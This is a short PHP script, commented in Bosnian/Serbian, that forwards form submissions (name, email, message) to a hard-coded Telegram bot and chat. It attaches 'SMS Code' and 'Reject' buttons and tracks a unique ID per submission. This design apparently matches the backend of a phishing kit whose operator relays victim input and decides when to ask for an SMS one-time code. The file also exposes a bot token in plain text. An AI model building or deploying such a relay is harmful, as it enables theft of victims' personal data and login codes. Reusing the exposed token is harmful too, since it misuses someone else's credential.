<?php

$telegramBotToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'] ?? 'Nepoznato';
    $email = $_POST['email'] ?? 'Nepoznato';
    $message = $_POST['message'] ?? 'Bez poruke';

    // Generisanje jedinstvenog ID-a
    $uniqueId = uniqid();

    // Priprema teksta poruke
    $text = "ID: $uniqueId\nNova poruka od:\nIme: $name\nEmail: $email\nPoruka: $message";

    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'SMS Code', 'callback_data' => 'sms'],
                ['text' => 'Reject', 'callback_data' => 'reject']
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'reply_markup' => json_encode($inlineKeyboard)
    ];

    // Slanje poruke putem Telegram API-ja
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramBotToken/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Ovdje dodajte logiku za čuvanje uniqueId i povezanog odgovora u bazi podataka

    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'response' => $response, 'uniqueId' => $uniqueId]);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
